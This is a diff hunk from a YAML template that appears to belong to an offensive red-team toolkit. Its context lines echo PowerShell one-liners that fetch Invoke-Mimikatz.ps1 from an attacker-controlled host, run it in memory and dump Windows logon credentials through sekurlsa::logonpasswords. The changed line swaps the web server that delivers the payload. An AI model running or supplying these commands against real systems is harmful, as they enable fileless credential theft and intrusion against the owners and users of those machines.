@@ -17,4 +17,4 @@ content: |
   echo 'Deliver & Inject to memory & Execute (PS 64-bit): %windir%\Sysnative\WindowsPowerShell\v1.0\powershell.exe -Command "& {IEX (New-Object System.Net.Webclient).DownloadString(\'http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -Command \'\\"privilege::debug\\" \\"token::elevate\\" \\"sekurlsa::logonpasswords\\" \\"exit\\"\'}"'; \
   echo 'Deliver & Inject to memory & Execute (PS 32-bit): powershell -Command "& {IEX (New-Object System.Net.Webclient).DownloadString(\'http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -Command \'\\"privilege::debug\\" \\"token::elevate\\" \\"sekurlsa::logonpasswords\\" \\"exit\\"\'}"'; \
   echo '================================================================'; \
-  python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+   python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
